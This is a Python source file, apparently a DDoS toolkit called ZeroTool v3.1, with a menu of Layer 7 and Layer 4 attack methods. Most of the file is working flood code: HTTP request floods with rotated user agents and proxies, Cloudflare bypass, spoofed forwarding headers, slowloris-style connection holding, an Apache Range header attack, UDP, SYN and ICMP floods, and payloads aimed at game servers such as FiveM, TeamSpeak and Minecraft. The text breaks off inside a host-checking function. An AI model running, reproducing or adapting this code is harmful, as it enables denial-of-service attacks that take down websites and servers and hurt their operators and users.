#Made By TheNull - Nullop1
#انگشت نکن بجه جون
import sys
import os
import time
import threading
import random
import socket
import ssl
import struct
import requests
import cloudscraper
import socks
import httpx
import uuid
from urllib.parse import urlparse
from colorama import Fore, init as colorama_init

colorama_init(autoreset=True)

G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE
B = Fore.BLUE
C = Fore.CYAN
P = Fore.MAGENTA
O = '\033[38;5;214m'
T = '\033[38;5;51m'
RESET = '\033[0m'

USER_AGENTS = [   # دست نزن بچه 
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
]
HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"]
REFERERS = [
    "https://www.google.com", "https://www.bing.com", "https://www.yahoo.com",
    "https://www.duckduckgo.com", "https://www.wikipedia.org"
]
COOKIES = [
    "sessionId=abc123; path=/; HttpOnly",
    "userId=def456; path=/; HttpOnly",
    "theme=dark; path=/; HttpOnly",
    "language=en; path=/; HttpOnly"
]
PAYLOADS = [
    '{"key1":"value1", "key2":"value2"}',
    '{"name":"John Doe", "email":"john.doe@example.com"}',
    '{"username":"jdoe", "password":"securepassword"}'
]

proxies = []

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    print(C + """
███████╗███████╗██████╗  ██████╗ ████████╗ ██████╗  ██████╗ ██╗     ███████╗
╚══███╔╝██╔════╝██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ███╔╝ █████╗  ██████╔╝██║   ██║   ██║   ██║   ██║██║   ██║██║     ███████╗
 ███╔╝  ██╔══╝  ██╔══██╗██║   ██║   ██║   ██║   ██║██║   ██║██║     ╚════██║
███████╗███████╗██║  ██║╚██████╔╝   ██║   ╚██████╔╝╚██████╔╝███████╗███████║
╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
""")
    print(G + """
              ╔══════════════════════════════════╗
              ║   Welcome to ZeroTool  v3.1      ║
              ╚══════════════════════════════════╝
                By: @nullop1  on Telegram/discord 
         https://github.com/Nullop1/ZeroTools PleaseStar :)
""")

def show_commands():
    print(G + """
╔══════════════════════════════════════════════════════════════════╗
║                        C O M M A N D S                           ║
╠══════════════════════════════════════════════════════════════════╣
║  l7 / layer7    Layer7 (HTTP) DDoS Methods                       ║
║  l4 / layer4    Layer4 (UDP/TCP) DDoS Methods                    ║
║  check / host   CheckHost (Site & Resolve Checker)               ║
║  spamreg        Register Spammer (Maintenance)                   ║
║  clear / cls    Clear Screen                                     ║
║  exit / quit    Exit ZeroTool                                    ║
╚══════════════════════════════════════════════════════════════════╝
""")

def countdown(t):
    until = time.time() + t
    while time.time() < until:
        remaining = int(until - time.time())
        sys.stdout.write(f"\r {M}[*]{W} Attack status => {remaining} sec left ")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write(f"\r {M}[*]{W} Attack Done !                                   \n")
    sys.stdout.flush()

def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path or "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    target['port'] = urlparse(url).netloc.split(":")[1] if ":" in urlparse(url).netloc else \
                     ("443" if target['scheme'] == "https" else "80")
    return target

def spoof(target):
    addr = [str(random.randrange(11, 197)), str(random.randrange(0, 255)),
            str(random.randrange(0, 255)), str(random.randrange(2, 254))]
    spoofip = ".".join(addr)
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f"X-Forwarded-For: {spoofip}\r\n"
        f"Real-IP: {spoofip}\r\n"
    )

def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        print(M + " [*] " + G + "Proxy file (./proxy.txt) not found")
        return False
    with open("./proxy.txt", 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    return bool(proxies)

def send_request(target_url, user_agent, http_method, referer, cookie, payload=None):
    headers = {"User-Agent": user_agent, "Referer": referer, "Cookie": cookie}
    try:
        if http_method == "GET":
            requests.get(target_url, headers=headers, timeout=5)
        elif http_method == "POST":
            requests.post(target_url, headers=headers, data=payload, timeout=5)
        elif http_method == "HEAD":
            requests.head(target_url, headers=headers, timeout=5)
        elif http_method == "OPTIONS":
            requests.options(target_url, headers=headers, timeout=5)
        elif http_method == "PUT":
            requests.put(target_url, headers=headers, data=payload, timeout=5)
        elif http_method == "DELETE":
            requests.delete(target_url, headers=headers, timeout=5)
        elif http_method == "PATCH":
            requests.patch(target_url, headers=headers, data=payload, timeout=5)
    except:
        pass

def ddos_normal(target, threads):
    def attack():
        while True:
            try:
                requests.get(target)
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def ddos_test(target, threads):
    def attack():
        while True:
            try:
                requests.get(target)
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def ddos_advanced(target, threads):
    def attack():
        while True:
            try:
                ua = random.choice(USER_AGENTS)
                method = random.choice(HTTP_METHODS)
                ref = random.choice(REFERERS)
                cookie = random.choice(COOKIES)
                payload = random.choice(PAYLOADS) if method in ["POST", "PUT", "PATCH"] else None
                send_request(target, ua, method, ref, cookie, payload)
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def launch_bypass(target, threads, duration):
    until = time.time() + duration
    scraper = cloudscraper.create_scraper()
    def attack():
        while time.time() < until:
            try:
                scraper.get(target)
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def browser_method(target, threads, duration):
    until = time.time() + duration
    def attack():
        while time.time() < until:
            try:
                ua = random.choice(USER_AGENTS)
                ref = random.choice(REFERERS)
                cookie = random.choice(COOKIES)
                headers = {"User-Agent": ua, "Referer": ref, "Cookie": cookie}
                requests.get(target, headers=headers, timeout=5)
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def LaunchCFB(url, th, t):
    until = time.time() + t
    scraper = cloudscraper.create_scraper()
    def attack():
        while time.time() < until:
            try:
                scraper.get(url, timeout=15)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchPXCFB(url, th, t):
    if not get_proxies():
        return
    until = time.time() + t
    scraper = cloudscraper.create_scraper()
    def attack():
        while time.time() < until:
            try:
                proxy = {'http': 'http://' + random.choice(proxies),
                         'https': 'http://' + random.choice(proxies)}
                scraper.get(url, proxies=proxy)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchRAW(url, th, t):
    until = time.time() + t
    def attack():
        while time.time() < until:
            try:
                requests.get(url)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchPXRAW(url, th, t):
    if not get_proxies():
        return
    until = time.time() + t
    def attack():
        while time.time() < until:
            try:
                proxy = {'http': 'http://' + random.choice(proxies),
                         'https': 'http://' + random.choice(proxies)}
                requests.get(url, proxies=proxy)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchPOST(url, th, t):
    until = time.time() + t
    def attack():
        while time.time() < until:
            try:
                requests.post(url)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchHEAD(url, th, t):
    until = time.time() + t
    def attack():
        while time.time() < until:
            try:
                requests.head(url)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchPPS(url, th, t):
    target = get_target(url)
    until = time.time() + t
    def attack():
        try:
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
            while time.time() < until:
                try:
                    for _ in range(100):
                        s.send(b"GET / HTTP/1.1\r\n\r\n")
                except:
                    s.close()
                    break
        except:
            pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchSOC(url, th, t):
    target = get_target(url)
    until = time.time() + t
    req = ("GET " + target['uri'] + " HTTP/1.1\r\n"
           "Host: " + target['host'] + "\r\n"
           "User-Agent: " + random.choice(USER_AGENTS) + "\r\n"
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
           "Connection: Keep-Alive\r\n\r\n")
    def attack():
        try:
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
            while time.time() < until:
                try:
                    for _ in range(100):
                        s.send(req.encode())
                except:
                    s.close()
                    break
        except:
            pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchPXSOC(url, th, t):
    if not get_proxies():
        return
    target = get_target(url)
    until = time.time() + t
    req = ("GET " + target['uri'] + " HTTP/1.1\r\n"
           "Host: " + target['host'] + "\r\n"
           "User-Agent: " + random.choice(USER_AGENTS) + "\r\n"
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
           "Connection: Keep-Alive\r\n\r\n")
    def attack():
        try:
            proxy_data = random.choice(proxies).split(":")
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.set_proxy(socks.HTTP, proxy_data[0], int(proxy_data[1]))
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.set_proxy(socks.HTTP, proxy_data[0], int(proxy_data[1]))
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
            while time.time() < until:
                try:
                    for _ in range(100):
                        s.send(req.encode())
                except:
                    s.close()
                    break
        except:
            pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchSPOOF(url, th, t):
    target = get_target(url)
    until = time.time() + t
    req = ("GET " + target['uri'] + " HTTP/1.1\r\n"
           "Host: " + target['host'] + "\r\n"
           "User-Agent: " + random.choice(USER_AGENTS) + "\r\n"
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
           + spoof(target) +
           "Connection: Keep-Alive\r\n\r\n")
    def attack():
        try:
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
            while time.time() < until:
                try:
                    for _ in range(100):
                        s.send(req.encode())
                except:
                    s.close()
                    break
        except:
            pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchPXSPOOF(url, th, t):
    if not get_proxies():
        return
    target = get_target(url)
    until = time.time() + t
    req = ("GET " + target['uri'] + " HTTP/1.1\r\n"
           "Host: " + target['host'] + "\r\n"
           "User-Agent: " + random.choice(USER_AGENTS) + "\r\n"
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
           + spoof(target) +
           "Connection: Keep-Alive\r\n\r\n")
    def attack():
        proxy_data = random.choice(proxies).split(":")
        try:
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, proxy_data[0], int(proxy_data[1]))
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, proxy_data[0], int(proxy_data[1]))
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
            while time.time() < until:
                try:
                    for _ in range(100):
                        s.send(req.encode())
                except:
                    s.close()
                    break
        except:
            pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchHTTP2(url, th, t):
    until = time.time() + t
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin',
    }
    def attack():
        client = httpx.Client(http2=True)
        while time.time() < until:
            try:
                client.get(url, headers=headers)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchPXHTTP2(url, th, t):
    if not get_proxies():
        return
    until = time.time() + t
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin',
    }
    def attack():
        while time.time() < until:
            try:
                client = httpx.Client(http2=True, proxies={
                    'http://': 'http://'+random.choice(proxies),
                    'https://': 'http://'+random.choice(proxies)})
                client.get(url, headers=headers)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchNULL(url, th, t):
    target = get_target(url)
    until = time.time() + t
    req = ("GET " + target['uri'] + " HTTP/1.1\r\n"
           "Host: " + target['host'] + "\r\n"
           "User-Agent: null\r\n"
           "Referer: null\r\n"
           + spoof(target) +
           "Connection: Keep-Alive\r\n\r\n")
    def attack():
        try:
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
            while time.time() < until:
                try:
                    for _ in range(100):
                        s.send(req.encode())
                except:
                    s.close()
                    break
        except:
            pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchCOOKIE(url, th, t):
    target = get_target(url)
    until = time.time() + t
    req = ("GET " + target['uri'] + " HTTP/1.1\r\n"
           "Host: " + target['host'] + "\r\n"
           "User-Agent: " + random.choice(USER_AGENTS) + "\r\n"
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
           "Cookie: " + random.choice(COOKIES) + "\r\n"
           "Connection: Keep-Alive\r\n\r\n")
    def attack():
        try:
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
            while time.time() < until:
                try:
                    for _ in range(100):
                        s.send(req.encode())
                except:
                    s.close()
                    break
        except:
            pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchEVEN(url, th, t):
    target = get_target(url)
    until = time.time() + t
    req = ("GET " + target['uri'] + " HTTP/1.1\r\n"
           "Host: " + target['host'] + "\r\n"
           "User-Agent: " + random.choice(USER_AGENTS) + "\r\n"
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
           "Accept-Language: en-US,en;q=0.5\r\n"
           "Accept-Encoding: gzip, deflate, br\r\n"
           "Cache-Control: no-cache\r\n"
           "Pragma: no-cache\r\n"
           "Sec-Fetch-Dest: document\r\n"
           "Sec-Fetch-Mode: navigate\r\n"
           "Sec-Fetch-Site: none\r\n"
           "Sec-Fetch-User: ?1\r\n"
           "TE: trailers\r\n"
           "Connection: Keep-Alive\r\n\r\n")
    def attack():
        try:
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((target['host'], int(target['port'])))
            while time.time() < until:
                try:
                    for _ in range(100):
                        s.send(req.encode())
                except:
                    s.close()
                    break
        except:
            pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchDYN(url, th, t):
    until = time.time() + t
    def attack():
        while time.time() < until:
            try:
                rand_sub = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
                target_host = urlparse(url).netloc
                target_scheme = urlparse(url).scheme
                dyn_url = f"{target_scheme}://{rand_sub}.{target_host}"
                requests.get(dyn_url, timeout=5)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchBOT(url, th, t):
    until = time.time() + t
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", #دنبال چیی؟  اینجا یوزر ایجنته 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }
    def attack():
        while time.time() < until:
            try:
                requests.get(url, headers=headers, timeout=5)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchXMLRPC(url, th, t):
    until = time.time() + t
    target = url.rstrip('/') + '/xmlrpc.php'
    payload = '<methodCall><methodName>system.listMethods</methodName></methodCall>'
    def attack():
        while time.time() < until:
            try:
                requests.post(target, data=payload, timeout=5)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchAPACHE(url, th, t):
    until = time.time() + t
    def attack():
        while time.time() < until:
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Range": "bytes=0-,5-1,5-2,5-3,5-4,5-5,5-6,5-7,5-8,5-9"
                }
                requests.get(url, headers=headers, timeout=5)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchOVH(url, th, t):
    until = time.time() + t
    def attack():
        while time.time() < until:
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Cache-Control": "no-cache, no-store, must-revalidate",
                    "Pragma": "no-cache"
                }
                requests.get(url, headers=headers, timeout=5)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchRHEX(url, th, t):
    until = time.time() + t
    def attack():
        while time.time() < until:
            try:
                rand_hex = ''.join(random.choices('abcdef0123456789', k=64))
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "X-Hex": rand_hex
                }
                requests.get(url, headers=headers, timeout=5)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchSTOMP(url, th, t):
    until = time.time() + t
    def attack():
        while time.time() < until:
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1"
                }
                requests.get(url, headers=headers, timeout=5)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchSTRESS(url, th, t):
    until = time.time() + t
    def attack():
        while time.time() < until:
            try:
                high_byte = 'A' * random.randint(1000, 5000)
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "X-Stress": high_byte
                }
                requests.get(url, headers=headers, timeout=5)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchDOWNLOADER(url, th, t):
    until = time.time() + t
    def attack():
        while time.time() < until:
            try:
                r = requests.get(url, stream=True, timeout=10)
                for chunk in r.iter_content(chunk_size=1):
                    pass
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchSLOW(url, th, t):
    until = time.time() + t
    def attack():
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        while time.time() < until:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                target_host = urlparse(url).netloc
                port = int(urlparse(url).port or (443 if urlparse(url).scheme == 'https' else 80))
                s.connect((target_host, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {target_host}\r\n".encode())
                s.send(f"User-Agent: {headers['User-Agent']}\r\n".encode())
                s.send("Accept: text/html\r\n".encode())
                time.sleep(random.uniform(5, 15))
                s.close()
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchBOMB(url, th, t):
    until = time.time() + t
    def attack():
        while time.time() < until:
            try:
                for _ in range(50):
                    requests.get(url, timeout=2)
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def LaunchKILLER(url, th, t):
    until = time.time() + t
    def attack():
        while time.time() < until:
            try:
                threading.Thread(target=lambda: requests.get(url, timeout=5)).start()
                threading.Thread(target=lambda: requests.head(url, timeout=5)).start()
                threading.Thread(target=lambda: requests.post(url, timeout=5)).start()
            except:
                pass
    for _ in range(th):
        threading.Thread(target=attack, daemon=True).start()

def run_udp_flood(host, port, th, t):
    until = time.time() + t
    payload = random._urandom(60000)
    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < until:
            try:
                sock.sendto(payload, (host, int(port)))
            except:
                sock.close()
                return
    for _ in range(th):
        threading.Thread(target=udp_flood, daemon=True).start()

def run_tcp_flood(host, port, th, t):
    until = time.time() + t
    payload = random._urandom(4096)
    def tcp_flood():
        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
        while time.time() < until:
            try:
                sock.sendto(payload, (host, int(port)))
            except:
                sock.close()
                return
    for _ in range(th):
        threading.Thread(target=tcp_flood, daemon=True).start()

def LaunchSYN(host, port, th, t):
    until = time.time() + t
    def syn_flood():
        while time.time() < until:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect_ex((host, int(port)))
                s.close()
            except:
                pass
    for _ in range(th):
        threading.Thread(target=syn_flood, daemon=True).start()

def LaunchICMP(host, th, t):
    until = time.time() + t
    def icmp_flood():
        try:
            packet = struct.pack('!HH', 8, 0)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            while time.time() < until:
                try:
                    sock.sendto(packet, (host, 0))
                except:
                    break
        except:
            print(R + "[ICMP] Requires root/admin privileges")
    for _ in range(th):
        threading.Thread(target=icmp_flood, daemon=True).start()

def LaunchVSE(host, port, th, t):
    until = time.time() + t
    payload = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
    def vse_flood():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            while time.time() < until:
                try:
                    s.sendto(payload, (host, int(port)))
                except:
                    break
    for _ in range(th):
        threading.Thread(target=vse_flood, daemon=True).start()

def LaunchTS3(host, port, th, t):
    until = time.time() + t
    payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
    def ts3_flood():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            while time.time() < until:
                try:
                    s.sendto(payload, (host, int(port)))
                except:
                    break
    for _ in range(th):
        threading.Thread(target=ts3_flood, daemon=True).start()

def LaunchFIVEM(host, port, th, t):
    until = time.time() + t
    payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
    def fivem_flood():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            while time.time() < until:
                try:
                    s.sendto(payload, (host, int(port)))
                except:
                    break
    for _ in range(th):
        threading.Thread(target=fivem_flood, daemon=True).start()

def LaunchMINECRAFT(host, port, th, t):
    until = time.time() + t
    def mc_flood():
        while time.time() < until:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, int(port)))
                handshake = b'\x00\x00' + struct.pack('>b', len(host)) + host.encode() + struct.pack('>H', int(port)) + b'\x01'
                packet = struct.pack('>b', len(handshake)) + handshake
                s.send(b'\x00' + packet + b'\x01\x00')
                s.close()
            except:
                pass
    for _ in range(th):
        threading.Thread(target=mc_flood, daemon=True).start()

def LaunchOVHUDP(host, port, th, t):
    until = time.time() + t
    def ovhudp_flood():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            while time.time() < until:
                try:
                    http_header = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()
                    payload = http_header + random._urandom(1024)
                    s.sendto(payload, (host, int(port)))
                except:
                    break
    for _ in range(th):
        threading.Thread(target=ovhudp_flood, daemon=True).start()

def LaunchCPS(host, port, th, t):
    until = time.time() + t
    def cps_flood():
        while time.time() < until:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                s.connect_ex((host, int(port)))
                s.close()
            except:
                pass
    for _ in range(th):
        threading.Thread(target=cps_flood, daemon=True).start()

def LaunchCONNECTION(host, port, th, t):
    until = time.time() + t
    def conn_flood():
        while time.time() < until:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, int(port)))
                s.send(b'\x00')
                time.sleep(random.uniform(1, 10))
                s.close()
            except:
                pass
    for _ in range(th):
        threading.Thread(target=conn_flood, daemon=True).start()

def LaunchMCPE(host, port, th, t):
    until = time.time() + t
    def mcpe_flood():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            while time.time() < until:
                try:
                    packet = b'\x01' + struct.pack('>Q', int(time.time())) + b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
                    s.sendto(packet, (host, int(port)))
                except:
                    break
    for _ in range(th):
        threading.Thread(target=mcpe_flood, daemon=True).start()

def LaunchFIVEMTOKEN(host, port, th, t):
    until = time.time() + t
    def fivemtoken_flood():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            while time.time() < until:
                try:
                    token = str(uuid.uuid4())
                    steamid = str(random.randint(76561197960265728, 76561199999999999))
                    payload = f"token={token}&guid={steamid}".encode()
                    s.sendto(payload, (host, int(port)))
                except:
                    break
    for _ in range(th):
        threading.Thread(target=fivemtoken_flood, daemon=True).start()

def check_host():
    clear()
    print(G + """
    ╔══════════════════════════════════════════╗
    ║           CheckHost  B1.0                ║
    ╚══════════════════════════════════════════╝
    """)

    def ip_to_number(ip_str):
        try:
            packed = socket.inet_aton(ip_str)
            return int.from_bytes(packed, 'big')
        except:
            return None

    def get_ip(host):
        try:
            return socket.gethostbyname(host)
        except:
            return None

    def tcp_port_check(ip, port, timeout=2):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            start = time.time()
            s.connect((ip, port))
            lat = (time.time() - start) * 1000
            s.close()
            return True, lat
        except:
            return False, None

    def udp_port_check(ip, port, timeout=2):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(b'\x00', (ip, port))
            s.recvfrom(1024)
            s.close()
            return True
        except socket.timeout:
            return True
        except:
            return False

    def http_check(url, timeout=5):
        start = time.time()
        try:
            r = requests.get(url, timeout=timeout)
            lat = (time.time() - start) * 1000
            if 200 <= r.status_code < 400:
                return True, r.status_code, r.reason, None, lat
            else:
                return False, r.status_code, r.reason, None, lat
        except requests.exceptions.Timeout:
            return False, None, None, "Timeout", None
